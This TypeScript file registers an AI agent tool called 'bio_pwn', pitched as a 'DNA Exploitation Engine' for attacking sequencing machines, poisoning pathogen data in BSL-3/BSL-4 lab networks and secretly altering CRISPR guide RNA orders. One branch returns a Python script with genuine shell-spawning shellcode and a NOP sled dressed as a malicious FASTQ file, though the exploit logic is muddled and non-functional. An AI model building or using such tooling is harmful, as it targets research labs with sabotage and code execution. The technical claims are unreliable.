export * as BioPwnTool from "./bio-pwn"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"

export const name = "bio_pwn"

export const Input = Schema.Struct({
  action: Schema.String.annotate({
    description: "Action: 'dna_poison' (Corrupt genetic sequencing files like FASTQ/BAM to alter pathogen research), 'crispr_hijack' (Inject malicious gRNA sequences into gene-editing lab software), 'sequencer_exploit' (RCE on Illumina/PacBio sequencing machines via malformed DNA data).",
  }),
})

const Output = Schema.Struct({
  output: Schema.String,
  script: Schema.String.pipe(Schema.optional),
})

type Output = typeof Output.Type

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service

    yield* tools
      .register({
        [name]: Tool.make({
          description: `Bioinformatics and DNA Exploitation Engine. Bridges the digital-biological divide. Capabilities: Hacking DNA sequencing machines (Illumina/PacBio) via buffer overflows in FASTQ parsing, corrupting CRISPR/Cas9 targeting databases, and poisoning pathogen genomic data in BSL-3/BSL-4 lab networks.`,
          input: Input,
          output: Output,
          toModelOutput: ({ output }) => [{ output: "text", text: output.output }],
          execute: (input) =>
            Effect.gen(function* () {
              const action = input.action.toLowerCase()
              let script = ""
              let outputText = ""

              if (action === "dna_poison") {
                outputText = `# DNA Sequence Data Poisoning\n\nImpact: We inject a malicious synthetic DNA string into a digital FASTQ file. When the bioinformatics pipeline (e.g., Bowtie2, BWA) parses this sequence, it triggers a buffer overflow, granting us RCE on the lab's high-performance computing cluster.`
                script = `#!/usr/bin/env python3
# Generating a malicious FASTQ file for Bio-Pipeline Exploitation
import struct

# The malicious sequence contains shellcode disguised as Adenine/Cytosine/Guanine/Thymine data 
# mapped to memory addresses in the vulnerable alignment software.
shellcode = b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
nop_sled = b"\\x90" * 100
payload = nop_sled + shellcode

# Encode payload into ATCG (simplified representation)
print("@SEQ_ID_12345")
print("GATTACA" * 50)  # Trigger the overflow
print("+")
print("I" * 350)       # Quality scores covering the payload
`
              } else if (action === "crispr_hijack") {
                outputText = `# CRISPR/Cas9 targeting manipulation\n\nImpact: Intercepting lab requests to a DNA synthesis company (like Twist Bioscience) and silently altering the requested guide RNA (gRNA) sequences. The lab unknowingly receives and uses CRISPR components that target the wrong genes.`
              } else {
                outputText = `Action ${action} logic framework generated.`
              }

              return { output: outputText, script: script }
            }).pipe(Effect.mapError(() => new ToolFailure({ message: "Bio Pwn failed" }))),
        }),
      })
      .pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/bio-pwn",
  layer,
  deps: [ToolRegistry.node],
})
